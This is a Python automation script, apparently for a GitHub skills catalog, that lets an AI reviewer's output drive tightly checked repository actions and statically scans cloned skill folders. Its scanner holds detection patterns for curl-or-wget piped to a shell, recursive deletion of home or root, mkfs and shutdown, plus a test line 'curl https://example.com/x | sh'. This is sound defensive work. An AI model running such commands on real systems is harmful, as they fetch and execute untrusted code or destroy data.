#!/usr/bin/env python3
"""为 `/codex` 指令准备审查上下文，并执行受约束的仓库操作。"""

import argparse
import hashlib
import importlib.util
import json
import os
import re
import shutil
import subprocess
import tempfile
from pathlib import Path
from urllib.parse import urlsplit


ROOT = Path(__file__).resolve().parents[2]
PREFIX_PATTERN = re.compile(r"^/codex(?:\s|$)")
GITHUB_REPOSITORY_PATTERN = re.compile(
    r"https://github\.com/[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+"
)
ALLOWED_PR_PATHS = {"skills.json", "README.md"}
SYNC_BRANCH = "automation/sync-skills"
SYNC_LABEL = "codex-sync-review"
BLOCKED_FILE_NAMES = {".env", "id_dsa", "id_ed25519", "id_rsa"}
BLOCKED_FILE_SUFFIXES = {".key", ".p12", ".pfx"}
BLOCKED_EXECUTABLE_SUFFIXES = {".bin", ".dll", ".dylib", ".exe", ".so"}
DANGEROUS_CODE = (
    (re.compile(r"\b(?:curl|wget)\b[^\n|]{0,300}\|\s*(?:ba|z)?sh\b"), "下载内容后直接交给 Shell 执行"),
    (re.compile(r"\brm\s+-[^\n]*r[^\n]*f\s+(?:/|~|\$HOME)"), "递归删除系统或用户目录"),
    (re.compile(r"\b(?:mkfs|shutdown|reboot)\b"), "执行高风险系统命令"),
)


def _run(command, *, cwd=ROOT, env=None, capture=False, timeout=None, check=True):
    """执行确定性命令，并在失败时保留原始错误。"""
    return subprocess.run(
        command,
        cwd=cwd,
        env=env,
        check=check,
        capture_output=capture,
        text=True,
        timeout=timeout,
    )


def _gh_json(endpoint, *, method="GET", fields=None):
    """调用 GitHub CLI，并返回 JSON 结果。"""
    command = ["gh", "api", endpoint]
    input_text = None
    if method != "GET":
        command.extend(["--method", method, "--input", "-"])
        input_text = json.dumps(fields or {}, ensure_ascii=False)
    result = subprocess.run(
        command,
        cwd=ROOT,
        check=True,
        capture_output=True,
        text=True,
        input=input_text,
    )
    return json.loads(result.stdout) if result.stdout.strip() else None


def _load_sync_module(root):
    """加载现有同步脚本，并把路径绑定到待验证仓库。"""
    script_path = ROOT / ".github/scripts/sync_skills.py"
    spec = importlib.util.spec_from_file_location("skills_hub_sync", script_path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    module.ROOT = root
    module.CONFIG_PATH = root / "skills.json"
    module.README_PATH = root / "README.md"
    module.SKILLS_PATH = root / "skills"
    return module


def _inside(path, root):
    """判断解析后的路径是否仍位于指定目录。"""
    try:
        path.resolve(strict=False).relative_to(root.resolve())
        return True
    except ValueError:
        return False


def scan_skill_tree(root):
    """静态扫描 Skill 文件，不执行其中任何代码。"""
    findings = []
    total_size = 0
    file_count = 0
    if not root.is_dir():
        return [{"level": "error", "path": str(root), "reason": "目录不存在"}]

    for path in root.rglob("*"):
        relative = path.relative_to(root).as_posix()
        if ".git" in path.parts:
            continue
        if path.is_symlink():
            if not _inside(path, root):
                findings.append(
                    {"level": "error", "path": relative, "reason": "符号链接指向目录外"}
                )
            continue
        if not path.is_file():
            continue

        file_count += 1
        size = path.stat().st_size
        total_size += size
        if (
            path.name in BLOCKED_FILE_NAMES
            or path.name.startswith(".env.")
            or path.suffix.lower() in BLOCKED_FILE_SUFFIXES
        ):
            findings.append(
                {"level": "error", "path": relative, "reason": "包含凭据或私钥类文件"}
            )
        if path.suffix.lower() in BLOCKED_EXECUTABLE_SUFFIXES:
            findings.append(
                {"level": "error", "path": relative, "reason": "包含未经审查的可执行二进制文件"}
            )
        if size > 50 * 1024 * 1024:
            findings.append(
                {"level": "error", "path": relative, "reason": "单个文件超过 50 MiB"}
            )
        if size > 1024 * 1024:
            continue
        try:
            content = path.read_text(encoding="utf-8")
        except UnicodeDecodeError:
            continue
        for pattern, reason in DANGEROUS_CODE:
            if pattern.search(content):
                findings.append({"level": "error", "path": relative, "reason": reason})

    if total_size > 200 * 1024 * 1024:
        findings.append(
            {"level": "error", "path": ".", "reason": "目录总大小超过 200 MiB"}
        )
    if file_count > 5000:
        findings.append({"level": "error", "path": ".", "reason": "文件数量超过 5000"})
    return findings


def validate_catalog(root):
    """验证目录、配置、描述、README 和静态安全约束。"""
    errors = []
    sync = _load_sync_module(root)
    try:
        sources = sync._load_sources()
    except (OSError, ValueError, json.JSONDecodeError) as error:
        return [str(error)]

    locations = set()
    for source in sources:
        location = (source["repository"], source["path"])
        if location in locations:
            errors.append(f"重复的上游位置：{source['repository']}#{source['path']}")
        locations.add(location)

        description = source["description"]
        if not 12 <= len(description) <= 120:
            errors.append(f"{source['name']} 的用途说明应为 12–120 个字符")
        if not re.search(r"[\u4e00-\u9fff]", description):
            errors.append(f"{source['name']} 的用途说明必须使用中文")
        if "\n" in description or re.search(r"https?://|\[[^]]+\]\(", description):
            errors.append(f"{source['name']} 的用途说明必须是纯文本单行")
        if description.endswith(("。", ".", "！", "!", "？", "?", "；", ";")):
            errors.append(f"{source['name']} 的用途说明末尾不加标点")

    skills_path = root / "skills"
    expected_names = {source["name"] for source in sources}
    actual_names = (
        {path.name for path in skills_path.iterdir() if path.is_dir() and not path.name.startswith(".")}
        if skills_path.is_dir()
        else set()
    )
    for name in sorted(expected_names - actual_names):
        errors.append(f"缺少 Skill 目录：skills/{name}")
    for name in sorted(actual_names - expected_names):
        errors.append(f"未在 skills.json 登记的目录：skills/{name}")

    for name in sorted(expected_names & actual_names):
        if (skills_path / name).is_symlink():
            errors.append(f"skills/{name} 不能是符号链接目录")
            continue
        skill_file = skills_path / name / "SKILL.md"
        if not skill_file.is_file() or skill_file.is_symlink():
            errors.append(f"skills/{name} 缺少真实的 SKILL.md")
        for finding in scan_skill_tree(skills_path / name):
            if finding["level"] == "error":
                errors.append(f"skills/{name}/{finding['path']}：{finding['reason']}")

    try:
        readme = (root / "README.md").read_text(encoding="utf-8")
        update_times = sync._load_update_times(readme)
        for source in sources:
            updated_at = update_times.get(source["name"])
            if not updated_at or not re.fullmatch(r"\d{4}-\d{2}-\d{2} \d{2}:\d{2}", updated_at):
                errors.append(f"{source['name']} 缺少有效的同步时间")
        rendered = sync._render_readme(
            readme, sources, update_times
        )
        if rendered != readme:
            errors.append("README 技能清单与 skills.json 不一致，请运行同步脚本")
    except (OSError, ValueError) as error:
        errors.append(str(error))
    return errors


def _tree_manifest(root):
    """生成目录内容清单，用于确认同步文件与上游完全一致。"""
    manifest = {}
    for path in sorted(root.rglob("*")):
        if ".git" in path.parts:
            continue
        relative = path.relative_to(root).as_posix()
        if path.is_symlink():
            manifest[relative] = ("link", os.readlink(path))
        elif path.is_dir():
            continue
        elif path.is_file():
            digest = hashlib.sha256()
            with path.open("rb") as file:
                for chunk in iter(lambda: file.read(1024 * 1024), b""):
                    digest.update(chunk)
            manifest[relative] = ("file", digest.hexdigest())
    return manifest


def verify_upstreams(root, skill_names):
    """重新克隆受影响上游，验证待合并目录确为同步结果。"""
    sync = _load_sync_module(root)
    sources = {source["name"]: source for source in sync._load_sources()}
    errors = []
    safe_env = os.environ.copy()
    safe_env.pop("GH_TOKEN", None)
    safe_env.pop("GITHUB_TOKEN", None)
    with tempfile.TemporaryDirectory(prefix="codex-upstream-") as directory:
        temporary_root = Path(directory)
        for index, name in enumerate(sorted(skill_names)):
            source = sources.get(name)
            if source is None:
                errors.append(f"{name} 已从 skills.json 删除，收录管家不处理删除")
                continue
            clone = temporary_root / f"repo-{index}"
            expected = temporary_root / f"expected-{index}"
            try:
                _run(
                    [
                        "git", "clone", "--depth", "1", "--no-recurse-submodules",
                        source["repository"], str(clone),
                    ],
                    env=safe_env,
                    timeout=120,
                )
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
                errors.append(f"{name} 的上游仓库无法克隆")
                continue
            source_path = clone / source["path"]
            if source_path.is_symlink() or not (source_path / "SKILL.md").is_file():
                errors.append(f"{name} 的上游路径缺少 SKILL.md")
                continue
            shutil.copytree(
                source_path,
                expected,
                ignore=shutil.ignore_patterns(".git"),
                symlinks=True,
            )
            license_path = clone / "LICENSE"
            if (
                source["path"] != "."
                and license_path.is_file()
                and not (expected / "LICENSE").exists()
            ):
                shutil.copy2(license_path, expected / "LICENSE")
            if _tree_manifest(expected) != _tree_manifest(root / "skills" / name):
                errors.append(f"skills/{name} 与当前上游内容不一致")
    return errors


def _repository_urls(texts, current_repository):
    """从不可信文本中提取并规范化 GitHub 仓库根地址。"""
    urls = []
    for text in texts:
        for match in GITHUB_REPOSITORY_PATTERN.findall(text or ""):
            parsed = urlsplit(match.rstrip("./"))
            parts = [part for part in parsed.path.split("/") if part]
            if len(parts) < 2:
                continue
            url = f"https://github.com/{parts[0]}/{parts[1].removesuffix('.git')}"
            if url.lower() == f"https://github.com/{current_repository}".lower():
                continue
            if url not in urls:
                urls.append(url)
    return urls[:3]


def prepare_context(event_path, output_directory):
    """获取 Issue/PR 上下文、相关条目和候选上游的静态扫描结果。"""
    event = json.loads(event_path.read_text(encoding="utf-8"))
    repository = event["repository"]["full_name"]
    issue_number = event["issue"]["number"]
    output_directory.mkdir(parents=True, exist_ok=True)

    issue = _gh_json(f"repos/{repository}/issues/{issue_number}")
    comments = _gh_json(
        f"repos/{repository}/issues/{issue_number}/comments?per_page=100"
    )
    repository_issues = _gh_json(
        f"repos/{repository}/issues?state=all&per_page=100"
    )
    repository_pulls = _gh_json(
        f"repos/{repository}/pulls?state=all&per_page=100"
    )
    pull_request = None
    pull_files = []
    if "pull_request" in issue:
        pull_request = _gh_json(f"repos/{repository}/pulls/{issue_number}")
        pull_files = _gh_json(
            f"repos/{repository}/pulls/{issue_number}/files?per_page=100"
        )
        _run(["git", "fetch", "--no-tags", "origin", f"refs/pull/{issue_number}/head"])
        pull_checkout = output_directory / "pull-request"
        _run(["git", "worktree", "add", "--detach", str(pull_checkout), "FETCH_HEAD"])
        pull_request["checkout_path"] = str(pull_checkout)

    texts = [issue.get("title"), issue.get("body"), event["comment"].get("body")]
    texts.extend(comment.get("body") for comment in comments)
    texts.extend(file.get("patch") for file in pull_files)
    upstreams = []
    upstream_root = output_directory / "upstreams"
    upstream_root.mkdir()
    clone_env = os.environ.copy()
    clone_env.pop("GH_TOKEN", None)
    clone_env.pop("GITHUB_TOKEN", None)
    for index, repository_url in enumerate(_repository_urls(texts, repository)):
        target = upstream_root / str(index)
        record = {"repository": repository_url, "path": str(target), "clone_error": None}
        try:
            _run(
                [
                    "git",
                    "clone",
                    "--depth",
                    "1",
                    "--filter=blob:limit=2m",
                    "--no-recurse-submodules",
                    repository_url,
                    str(target),
                ],
                env=clone_env,
                timeout=120,
            )
            shutil.rmtree(target / ".git", ignore_errors=True)
            record["static_findings"] = scan_skill_tree(target)
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as error:
            record["clone_error"] = str(error)
        upstreams.append(record)

    context = {
        "instruction": event["comment"]["body"],
        "issue": issue,
        "comments": comments,
        "pull_request": pull_request,
        "pull_files": pull_files,
        "repository_issues": [
            item for item in repository_issues if "pull_request" not in item
        ],
        "repository_pulls": repository_pulls,
        "upstreams": upstreams,
    }
    (output_directory / "context.json").write_text(
        json.dumps(context, ensure_ascii=False, indent=2), encoding="utf-8"
    )


def prepare_sync_context(repository, pr_number, output_directory):
    """为指定仓库和 PR 生成只读审查上下文，并写入目标目录。"""
    event = {
        "repository": {"full_name": repository},
        "issue": {"number": pr_number},
        "comment": {"body": "自动审查上游 Skill 同步结果"},
    }
    with tempfile.NamedTemporaryFile("w", encoding="utf-8") as file:
        json.dump(event, file, ensure_ascii=False)
        file.flush()
        prepare_context(Path(file.name), output_directory)


def _post_comment(repository, number, body):
    """把模型结论作为数据发布到当前 Issue 或 PR。"""
    with tempfile.NamedTemporaryFile("w", encoding="utf-8", delete=False) as file:
        file.write(body[:30000])
        comment_path = file.name
    try:
        _run(["gh", "issue", "comment", str(number), "--repo", repository, "--body-file", comment_path])
    finally:
        Path(comment_path).unlink(missing_ok=True)


def _validate_candidate(candidate):
    """限制模型只能提供 skills.json 已有字段。"""
    required = {"name", "category", "repository", "path", "description"}
    if not isinstance(candidate, dict) or set(candidate) != required:
        raise ValueError("创建 PR 时缺少完整的 Skill 配置")
    if not all(isinstance(value, str) for value in candidate.values()):
        raise ValueError("Skill 配置字段必须是字符串")
    return candidate


def _create_pr(event, result):
    """从审查结果生成配置、同步文件并创建 Draft PR。"""
    if "pull_request" in event["issue"]:
        raise ValueError("请在 Issue 中创建新的收录 PR")
    candidate = _validate_candidate(result["candidate"])
    config_path = ROOT / "skills.json"
    config = json.loads(config_path.read_text(encoding="utf-8"))
    config["skills"].append(candidate)
    config_path.write_text(
        json.dumps(config, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    _load_sync_module(ROOT)._load_sources()

    safe_env = os.environ.copy()
    safe_env.pop("GH_TOKEN", None)
    safe_env.pop("GITHUB_TOKEN", None)
    _run(["python3", ".github/scripts/sync_skills.py"], env=safe_env)
    errors = validate_catalog(ROOT)
    if errors:
        raise ValueError("；".join(errors))

    issue_number = event["issue"]["number"]
    branch = f"codex/issue-{issue_number}-{os.environ['GITHUB_RUN_ID']}"
    _run(["git", "switch", "-c", branch])
    _run(["git", "add", "--", "skills.json", "README.md", "skills"])
    if _run(["git", "diff", "--cached", "--quiet"], check=False).returncode == 0:
        raise ValueError("没有可提交的收录变更")
    _run(["git", "config", "user.name", "github-actions[bot]"])
    _run(["git", "config", "user.email", "41898282+github-actions[bot]@users.noreply.github.com"])
    _run(["git", "commit", "-m", f"feat(catalog): 收录 {candidate['name']}"])
    _run(["git", "push", "origin", branch])

    repository = event["repository"]["full_name"]
    body = f"{result['comment']}\n\nCloses #{issue_number}"
    created = _run(
        [
            "gh", "pr", "create", "--repo", repository, "--draft",
            "--base", event["repository"]["default_branch"], "--head", branch,
            "--title", f"收录 {candidate['name']}", "--body", body,
        ],
        capture=True,
    )
    _post_comment(repository, issue_number, f"{result['comment']}\n\n已创建 Draft PR：{created.stdout.strip()}")


def _merge_pr(event, result):
    """在可信脚本完成最终验证后，以 squash 方式合并 PR。"""
    repository = event["repository"]["full_name"]
    current_is_pr = "pull_request" in event["issue"]
    pr_number = event["issue"]["number"] if current_is_pr else result["pr_number"]
    if not isinstance(pr_number, int) or pr_number < 1:
        raise ValueError("没有找到要合并的 PR")
    pull = _gh_json(f"repos/{repository}/pulls/{pr_number}")
    if pull["state"] != "open":
        raise ValueError("PR 必须处于开放状态")
    if pull["base"]["ref"] != event["repository"]["default_branch"]:
        raise ValueError("只能合并到默认分支")
    expected_sha = result["expected_head_sha"]
    if expected_sha != pull["head"]["sha"]:
        raise ValueError("PR 在审查后发生变化，请重新执行 /codex review")

    if pull["changed_files"] > 100:
        raise ValueError("收录 PR 修改文件超过 100 个，请拆分后重新审查")
    files = _gh_json(f"repos/{repository}/pulls/{pr_number}/files?per_page=100")
    changed_paths = {item["filename"] for item in files}
    invalid_paths = sorted(
        path for path in changed_paths
        if path not in ALLOWED_PR_PATHS and not path.startswith("skills/")
    )
    if invalid_paths:
        raise ValueError(f"收录 PR 包含越界文件：{', '.join(invalid_paths)}")

    _run(["git", "fetch", "--no-tags", "origin", f"refs/pull/{pr_number}/head"])
    with tempfile.TemporaryDirectory(prefix="codex-pr-") as directory:
        checkout = Path(directory) / "checkout"
        _run(["git", "worktree", "add", "--detach", str(checkout), "FETCH_HEAD"])
        try:
            errors = validate_catalog(checkout)
            base_config = json.loads((ROOT / "skills.json").read_text(encoding="utf-8"))
            head_config = json.loads((checkout / "skills.json").read_text(encoding="utf-8"))
            base_sources = {item["name"]: item for item in base_config["skills"]}
            head_sources = {item["name"]: item for item in head_config["skills"]}
            affected_names = {
                name for name in base_sources.keys() | head_sources.keys()
                if base_sources.get(name) != head_sources.get(name)
            }
            affected_names.update(
                path.split("/", 2)[1]
                for path in changed_paths
                if path.startswith("skills/") and len(path.split("/", 2)) > 1
            )
            errors.extend(verify_upstreams(checkout, affected_names))
        finally:
            _run(["git", "worktree", "remove", "--force", str(checkout)])
    if errors:
        raise ValueError("；".join(errors))
    _run(["python3", ".github/scripts/sync_skills.py", "--self-check"])
    if pull["draft"]:
        _run(["gh", "pr", "ready", str(pr_number), "--repo", repository])

    merged = _gh_json(
        f"repos/{repository}/pulls/{pr_number}/merge",
        method="PUT",
        fields={"merge_method": "squash", "sha": pull["head"]["sha"]},
    )
    if not merged.get("merged"):
        raise ValueError(merged.get("message", "GitHub 拒绝合并"))
    _post_comment(repository, event["issue"]["number"], result["comment"])


def _validate_sync_review(pull, repository, pr_number, result, changed_paths):
    """确认模型结论只作用于受控的自动同步 PR 及其已审查提交。"""
    action = result.get("action")
    expected_recommendation = {"merge": "merge", "comment": "request_changes"}
    if action not in expected_recommendation:
        raise ValueError("自动同步审查只能批准合并或提出修改意见")
    if result.get("recommendation") != expected_recommendation[action]:
        raise ValueError("自动同步审查结论与建议不一致")
    if result.get("pr_number") != pr_number:
        raise ValueError("Codex 返回的 PR 编号与当前同步 PR 不一致")
    if pull.get("state") != "open":
        raise ValueError("同步 PR 必须处于开放状态")
    head = pull.get("head") or {}
    head_repository = head.get("repo") or {}
    if head.get("ref") != SYNC_BRANCH or head_repository.get("full_name") != repository:
        raise ValueError("只能处理本仓库的自动同步分支")
    if result.get("expected_head_sha") != head.get("sha"):
        raise ValueError("同步 PR 在审查后发生变化，请重新审查")
    labels = {label.get("name") for label in pull.get("labels", [])}
    if SYNC_LABEL not in labels:
        raise ValueError(f"同步 PR 缺少 {SYNC_LABEL} 标签")
    invalid_paths = sorted(
        path
        for path in changed_paths
        if path != "README.md" and not path.startswith("skills/")
    )
    if invalid_paths:
        raise ValueError(f"同步 PR 包含越界文件：{', '.join(invalid_paths)}")


def execute_sync_result(repository, pr_number, result_path):
    """读取结构化审查结果，发布阻断意见或校验并合并指定 PR。"""
    try:
        result = json.loads(result_path.read_text(encoding="utf-8"))
        pull = _gh_json(f"repos/{repository}/pulls/{pr_number}")
        files = _gh_json(f"repos/{repository}/pulls/{pr_number}/files?per_page=100")
        changed_paths = {item["filename"] for item in files}
        _validate_sync_review(pull, repository, pr_number, result, changed_paths)
        if result["action"] == "comment":
            _post_comment(repository, pr_number, result["comment"])
            return

        repository_data = _gh_json(f"repos/{repository}")
        event = {
            "repository": {
                "full_name": repository,
                "default_branch": repository_data["default_branch"],
            },
            "issue": {"number": pr_number, "pull_request": {}},
        }
        _merge_pr(event, result)
    except Exception as error:
        _post_comment(repository, pr_number, f"自动合并已停止：{error}")
        raise


def execute_result(event_path, result_path):
    """验证 Owner 指令，并执行模型输出中的受限动作。"""
    event = json.loads(event_path.read_text(encoding="utf-8"))
    result = json.loads(result_path.read_text(encoding="utf-8"))
    actor = event["sender"]["login"]
    owner = event["repository"]["owner"]["login"]
    instruction = event["comment"]["body"]
    if actor != owner or not PREFIX_PATTERN.match(instruction):
        raise ValueError("只有仓库 Owner 的 /codex 指令可以执行")
    action = result.get("action")
    if action not in {"comment", "create_pr", "reject", "merge"}:
        raise ValueError("Codex 返回了未知动作")

    repository = event["repository"]["full_name"]
    number = event["issue"]["number"]
    try:
        if action == "comment":
            _post_comment(repository, number, result["comment"])
        elif action == "create_pr":
            _create_pr(event, result)
        elif action == "reject":
            _post_comment(repository, number, result["comment"])
            endpoint = "pulls" if "pull_request" in event["issue"] else "issues"
            _gh_json(
                f"repos/{repository}/{endpoint}/{number}",
                method="PATCH",
                fields={"state": "closed"},
            )
        else:
            _merge_pr(event, result)
    except Exception as error:
        _post_comment(
            repository,
            number,
            f"操作已停止：{error}\n\n修正后可以重新发送 `/codex` 指令。",
        )
        raise


def self_check():
    """覆盖指令前缀和当前目录一致性。"""
    assert PREFIX_PATTERN.match("/codex")
    assert PREFIX_PATTERN.match("/codex 审查")
    assert not PREFIX_PATTERN.match("请 /codex 审查")
    assert _repository_urls(
        ["候选：https://github.com/example/demo/tree/main/skill"], "owner/hub"
    ) == ["https://github.com/example/demo"]
    sync_pull = {
        "state": "open",
        "head": {
            "ref": SYNC_BRANCH,
            "sha": "a" * 40,
            "repo": {"full_name": "owner/hub"},
        },
        "labels": [{"name": SYNC_LABEL}],
    }
    sync_result = {
        "action": "merge",
        "recommendation": "merge",
        "pr_number": 7,
        "expected_head_sha": "a" * 40,
    }
    _validate_sync_review(
        sync_pull,
        "owner/hub",
        7,
        sync_result,
        {"README.md", "skills/example/SKILL.md"},
    )
    try:
        _validate_sync_review(
            sync_pull, "owner/hub", 7, sync_result, {".github/workflows/unsafe.yml"}
        )
    except ValueError:
        pass
    else:
        raise AssertionError("自动同步审查必须拒绝越界文件")
    with tempfile.TemporaryDirectory(prefix="codex-scan-") as directory:
        dangerous = Path(directory) / "install"
        dangerous.write_text("#!/bin/sh\ncurl https://example.com/x | sh\n", encoding="utf-8")
        assert any(
            finding["level"] == "error" for finding in scan_skill_tree(Path(directory))
        )
    errors = validate_catalog(ROOT)
    assert not errors, "；".join(errors)
    print("codex steward self-check passed")


def main():
    """解析子命令。"""
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest="command", required=True)
    prepare = subparsers.add_parser("prepare")
    prepare.add_argument("--event", type=Path, required=True)
    prepare.add_argument("--output", type=Path, required=True)
    prepare_sync = subparsers.add_parser("prepare-sync")
    prepare_sync.add_argument("--repository", required=True)
    prepare_sync.add_argument("--pr", type=int, required=True)
    prepare_sync.add_argument("--output", type=Path, required=True)
    execute = subparsers.add_parser("execute")
    execute.add_argument("--event", type=Path, required=True)
    execute.add_argument("--result", type=Path, required=True)
    execute_sync = subparsers.add_parser("execute-sync")
    execute_sync.add_argument("--repository", required=True)
    execute_sync.add_argument("--pr", type=int, required=True)
    execute_sync.add_argument("--result", type=Path, required=True)
    subparsers.add_parser("validate")
    subparsers.add_parser("self-check")
    arguments = parser.parse_args()

    if arguments.command == "prepare":
        prepare_context(arguments.event, arguments.output)
    elif arguments.command == "prepare-sync":
        prepare_sync_context(arguments.repository, arguments.pr, arguments.output)
    elif arguments.command == "execute":
        execute_result(arguments.event, arguments.result)
    elif arguments.command == "execute-sync":
        execute_sync_result(arguments.repository, arguments.pr, arguments.result)
    elif arguments.command == "validate":
        errors = validate_catalog(ROOT)
        if errors:
            raise SystemExit("\n".join(errors))
        print("catalog validation passed")
    else:
        self_check()


if __name__ == "__main__":
    main()
